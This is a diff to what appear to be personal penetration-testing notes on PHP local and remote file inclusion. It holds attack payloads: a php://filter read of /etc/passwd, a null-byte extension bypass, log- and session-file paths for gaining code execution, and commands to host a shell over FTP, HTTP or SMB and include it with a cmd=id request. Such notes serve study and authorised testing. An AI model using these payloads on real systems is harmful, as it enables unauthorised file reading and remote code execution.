@@ -56,6 +56,32 @@ php://filter/read=string.rot13/resource=/etc/passwd
 Extention bypassusing Null Byte - PHP versions before 5.5 are vulnerable to null byte injection, meaning that adding a null byte at the end of the filename should bypass the extension check. For example: language=/etc/passwd%00 will result in the statement include("/etc/passwd%00.php"), where the server ignores everything after the null byte.
 
 
+LFI RCE through Apache / Nginx Log Files;
+
+Can access Apache access log at /var/log/apache2/access.log
+
+
+
+RCE through PHP Session Files;
+PHP saves user sessions on disk. This path is dictated by the session.save_path configuration variable, which is empty by default. In such cases, the session files are saved to the /var/lib/php/sessions/ folder on Linux and C:\Windows\Temp on Windows. The name of the session file can be identified from the PHPSESSID cookie. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3 then it's location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.
+
+
+RFI;
+Include shell files from local machine to remote either my hosthing with python web server or alike server hosting
+
+FTP - python -m pyftpdlib -p 21
+    use the ftp:// scheme to access shell
+    If the server needs authentication, then the credentials can be specified in the following way:
+http://blog.example.com/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id
+
+Http - python3 -m http.server 8080
+
+
+WINDOWS - 
+
+SMB - smbserver.py -smb2support share $(pwd)
+
+
 
 FILE INCLUSION
 
